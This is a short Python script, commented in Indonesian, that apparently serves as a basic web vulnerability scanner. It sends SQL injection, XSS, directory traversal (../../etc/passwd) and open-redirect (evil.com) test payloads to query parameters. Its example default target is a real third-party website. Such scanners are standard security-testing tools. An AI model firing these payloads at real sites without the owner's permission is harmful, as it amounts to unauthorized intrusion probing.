import requests
from bs4 import BeautifulSoup

# Fungsi untuk mendeteksi SQL Injection
def detect_sql_injection(url):
    payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1"]
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}")
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[!] Potensi SQL Injection ditemukan dengan payload: {payload}")
                return True
        except Exception as e:
            print(f"[!] Error: {e}")
    return False

# Fungsi untuk mendeteksi Cross-Site Scripting (XSS)
def detect_xss(url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in payloads:
        try:
            response = requests.get(f"{url}?q={payload}")
            if payload in response.text:
                print(f"[!] Potensi XSS ditemukan dengan payload: {payload}")
                return True
        except Exception as e:
            print(f"[!] Error: {e}")
    return False

# Fungsi untuk mendeteksi Directory Traversal
def detect_directory_traversal(url):
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in payloads:
        try:
            response = requests.get(f"{url}?file={payload}")
            if "root:" in response.text or "[boot loader]" in response.text:
                print(f"[!] Potensi Directory Traversal ditemukan dengan payload: {payload}")
                return True
        except Exception as e:
            print(f"[!] Error: {e}")
    return False

# Fungsi untuk mendeteksi Open Redirect
def detect_open_redirect(url):
    payloads = ["http://evil.com", "//evil.com"]
    for payload in payloads:
        try:
            response = requests.get(f"{url}?redirect={payload}", allow_redirects=False)
            if response.status_code == 302 and "evil.com" in response.headers.get("Location", ""):
                print(f"[!] Potensi Open Redirect ditemukan dengan payload: {payload}")
                return True
        except Exception as e:
            print(f"[!] Error: {e}")
    return False

# Fungsi utama untuk menjalankan semua deteksi
def scan_website(url):
    print(f"[*] Memulai scan untuk website: {url}")
    if detect_sql_injection(url):
        print("[!] SQL Injection terdeteksi!")
    if detect_xss(url):
        print("[!] Cross-Site Scripting (XSS) terdeteksi!")
    if detect_directory_traversal(url):
        print("[!] Directory Traversal terdeteksi!")
    if detect_open_redirect(url):
        print("[!] Open Redirect terdeteksi!")
    print("[*] Scan selesai.")

# Contoh penggunaan
if __name__ == "__main__":
    target_url = "https://www.livechart.me/winter-2025/tv"  # Ganti dengan URL target Anda
    scan_website(target_url)